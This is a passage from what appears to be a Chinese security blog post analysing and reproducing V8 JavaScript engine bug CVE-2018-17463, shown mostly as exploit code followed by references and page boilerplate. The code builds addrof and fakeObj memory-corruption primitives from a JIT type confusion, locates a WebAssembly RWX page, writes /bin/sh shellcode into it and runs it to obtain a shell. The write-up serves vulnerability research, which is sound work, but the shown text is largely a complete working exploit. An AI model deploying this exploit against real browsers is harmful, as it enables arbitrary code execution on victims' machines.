<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {</span><br><span class="line">    <span class="hljs-built_in">Object</span>.defineProperty(obj, <span class="hljs-string">'b'</span> + i, {</span><br><span class="line">      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">      <span class="hljs-attr">value</span>: values[i]</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> obj;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> p1, p2;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findOverlapping</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> names = [];</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {</span><br><span class="line">    names[i] = <span class="hljs-string">'b'</span> + i;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">    function vuln(obj) {</span></span><br><span class="line"><span class="hljs-string">      obj.a;</span></span><br><span class="line"><span class="hljs-string">      this.Object.create(obj);</span></span><br><span class="line"><span class="hljs-string">      <span class="hljs-subst">${names.map((b) =&gt; <span class="hljs-string">`let <span class="hljs-subst">${b}</span> = obj.<span class="hljs-subst">${b}</span>;`</span>).join(<span class="hljs-string">'\n'</span>)}</span></span></span><br><span class="line"><span class="hljs-string">      return [<span class="hljs-subst">${names.join(<span class="hljs-string">', '</span>)}</span>];</span></span><br><span class="line"><span class="hljs-string">    }</span></span><br><span class="line"><span class="hljs-string">  `</span>)</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> values = [];</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {</span><br><span class="line">    values[i] = -i;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {</span><br><span class="line">    <span class="hljs-keyword">let</span> res = vuln(getObj(values));</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; -<span class="hljs-number">32</span>) {</span><br><span class="line">        [p1, p2] = [i, -res[i]];</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">throw</span> <span class="hljs-string">"[!] Failed to find overlapping"</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrof</span>(<span class="hljs-params">obj</span>) </span>{</span><br><span class="line">  <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">  function vuln(obj) {</span></span><br><span class="line"><span class="hljs-string">    obj.a;</span></span><br><span class="line"><span class="hljs-string">    this.Object.create(obj);</span></span><br><span class="line"><span class="hljs-string">    return obj.b<span class="hljs-subst">${p1}</span>.x1;</span></span><br><span class="line"><span class="hljs-string">  }</span></span><br><span class="line"><span class="hljs-string">`</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> values = [];</span><br><span class="line">  values[p1] = { <span class="hljs-attr">x1</span>: <span class="hljs-number">1.1</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">1.2</span> };</span><br><span class="line">  values[p2] = { <span class="hljs-attr">y</span>: obj };</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {</span><br><span class="line">    <span class="hljs-keyword">let</span> res = vuln(getObj(values));</span><br><span class="line">    <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1.1</span>) {</span><br><span class="line">      print(<span class="hljs-string">`[+] Object Address: <span class="hljs-subst">${Int64.fromDouble(res).toString()}</span>`</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">throw</span> <span class="hljs-string">"[!] AddrOf Primitive Failed"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, addr</span>) </span>{</span><br><span class="line">  <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">  function vuln(obj) {</span></span><br><span class="line"><span class="hljs-string">    obj.a;</span></span><br><span class="line"><span class="hljs-string">    this.Object.create(obj);</span></span><br><span class="line"><span class="hljs-string">    let orig = obj.b<span class="hljs-subst">${p1}</span>.x2;</span></span><br><span class="line"><span class="hljs-string">    obj.b<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${addr}</span>;</span></span><br><span class="line"><span class="hljs-string">    return orig;</span></span><br><span class="line"><span class="hljs-string">  }</span></span><br><span class="line"><span class="hljs-string">`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> values = [];</span><br><span class="line">  <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">1.1</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">1.2</span> };</span><br><span class="line">  values[p1] = o;</span><br><span class="line">  values[p2] = obj;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {</span><br><span class="line">    o.x2 = <span class="hljs-number">1.2</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> res = vuln(getObj(values));</span><br><span class="line">    <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1.2</span>) {</span><br><span class="line">      <span class="hljs-keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">throw</span> <span class="hljs-string">"[!] fakeObj Primitive Failed"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>]);</span><br><span class="line"><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule, {});</span><br><span class="line"><span class="hljs-keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">print(<span class="hljs-string">"[+] check whether vulnerability exists"</span>);</span><br><span class="line">check_vul();</span><br><span class="line">print(<span class="hljs-string">"[+] Finding Overlapping Properties..."</span>);</span><br><span class="line">findOverlapping();</span><br><span class="line">print(<span class="hljs-string">`[+] Properties b<span class="hljs-subst">${p1}</span> and b<span class="hljs-subst">${p2}</span> overlap!`</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> mem = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(mem);</span><br><span class="line">give_me_a_clean_newspace();</span><br><span class="line">print(<span class="hljs-string">"[+] get address of RWX Page"</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> addr = addrof(wasmInstance);</span><br><span class="line">fakeObj(mem, addr);</span><br><span class="line"><span class="hljs-keyword">let</span> code_addr = Int64.fromDouble(dv.getFloat64(<span class="hljs-number">0xf0</span> - <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>));</span><br><span class="line">print(<span class="hljs-string">`[+] rwx addr: <span class="hljs-subst">${code_addr}</span>`</span>);</span><br><span class="line">fakeObj(mem, code_addr.asDouble());</span><br><span class="line">print(<span class="hljs-string">"[+] write shellcode"</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> shellcode = [</span><br><span class="line">  <span class="hljs-number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="hljs-number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="hljs-number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"><span class="hljs-keyword">let</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(mem);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)</span><br><span class="line">  data_view.setBigUint64(<span class="hljs-number">8</span> * i, shellcode[i], <span class="hljs-literal">true</span>);</span><br><span class="line">print(<span class="hljs-string">"[+] GetShell"</span>);</span><br><span class="line">f();</span><br></pre></td></tr></tbody></table></figure>

<p>exp运行结果如下图，因为有大量循环，所以运行稍慢。<br><img src="/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/4.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/">http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/</a><br><a target="_blank" rel="noopener" href="https://v8.dev/blog/sparkplug">https://v8.dev/blog/sparkplug</a><br><a target="_blank" rel="noopener" href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p>
</body></html>
    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/V8/">#V8</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CVE/">#CVE</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2023/12/01/CVE-2023-4427%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">CVE-2023-4427分析与复现</a>
            
        </span>
    </div>
    
</article>


<div class="sharebox">
    
<div class="sharethis-inline-share-buttons"></div>
<script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=618a5a31fe4ac40012aea77e&amp;product=inline-share-buttons' async='async'></script>

</div>



<div class="comments">
    <h3 class="title is-4">Comments</h3>
    
<script>
    var disqus_config = function () {
        this.page.url = 'https://rycbar77.github.io/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/';
        this.page.identifier = '2023/12/01/V8漏洞CVE-2018-17463分析与复现/';
        
        this.language = 'en';
        
    };
    (function() {
        var d = document, s = d.createElement('script');  
        s.src = '//' + 'rrblog-2' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>

<div id="disqus_thread">
    
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2023 r4z77&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/rycbar77">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    moment.locale("en-AU");
</script>


    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script>
    MathJax.Hub.Config({
        "HTML-CSS": {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
</script>

    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof($.fn.justifiedGallery) === 'function') {
                $('.justified-gallery > p > .gallery-item').unwrap();
                $('.justified-gallery').justifiedGallery();
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/js/insight.js"></script>

    
</body>
</html>